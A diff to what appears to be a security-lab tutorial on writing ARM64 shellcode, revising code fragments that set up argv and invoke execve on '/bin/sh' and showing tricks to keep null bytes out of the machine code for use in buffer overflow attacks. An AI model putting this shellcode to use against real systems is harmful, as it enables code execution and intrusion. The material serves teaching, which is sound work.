@@ -210,13 +210,26 @@ and we will replace it with a zero.
 In our previous code, we have already stored the address of the string 
 in `x19`, so the `*`'s address is will be `x19 + 7`. 
 We just need to store a zero byte at this address. The code 
-below achieves this:
+below achieves this (the `wzr` is a zero register, which
+contains the value zero):
 
 ```
-eor  w9, w9, w9      // w9 = 0
 mov  x8, 7           // x8 = 7: the offset of the * in "/bin/sh*"
-strb w9, [x19, x8]   // Store a zero byte at x19 + x8 (i.e. x19 + 7)
+strb wzr, [x19, x8]  // Store a zero byte at x19 + x8 (i.e. x19 + 7)
 ```
+
+**Get rid of zero**. The instruction `"mov x8, 7"` actually has a 
+zero in the machine code. 
+The reason is that the value of `7` is too small. We will
+use the same trick: add a larger number and then deduct the extra value. 
+The following two instructions achieve the same goal: setting 
+`x8` to 7. There is no zero in their machine code. 
+
+```
+mov  x9, 2008      // x9 = 2008
+sub  x8, x9, 2001  // x8 = x9 - 2001 = 7
+```
+
 
 ### Construct the argv[] array
 
@@ -239,9 +252,8 @@ mov x8,  8
 mov x9,  x19         // x9  = address of the "/bin/bash" string
 str x9, [x19, x8]    // Save x9 to argv[0] at x19 + 8
 
-mov x8, 16
-eor x9, x9, x9       // x9 = 0
-str x9, [x19, x8]    // Save  0 to argv[1] at x19 + 16
+mov x8,  16
+str xzr, [x19, x8]   // Save  0 to argv[1] at x19 + 16
 ```
 
 ### Invoke the execve() system call 
@@ -254,14 +266,12 @@ argument. See the following code:
 ```
 mov  x0, x19         // x0 = addresss of command string ("/bin/sh")
 adds x1, x19, 8      // x1 = address argv[], which is x19 + 8 
-mov  x2, XZR         // x2 = 0; XZR is the zero register
+mov  x2, xzr         // x2 = 0; xzr is the zero register
 mov  x8, #221        // 221 is execve's system call number
 svc  #0x1337         // Invoke execve()
 ```
 
-### One minor issue 
-
-After a careful inspection of the machine code, we found that 
+**Get rid of zero**: After a careful inspection of the machine code, we found that 
 when we set the `x1` register above using `"adds `x1, x19, 8"`,
 the machine code for this instruction has a zero. 
 
@@ -302,6 +312,5 @@ code segment is read only, so writing to it will fail.
 The `--omagic` makes the code segment to be readable and writeable.
 In the buffer overflow attack, this is not an issue, because the shellcode 
 will be copied into the stack or heap, which is writable. 
-
 
 
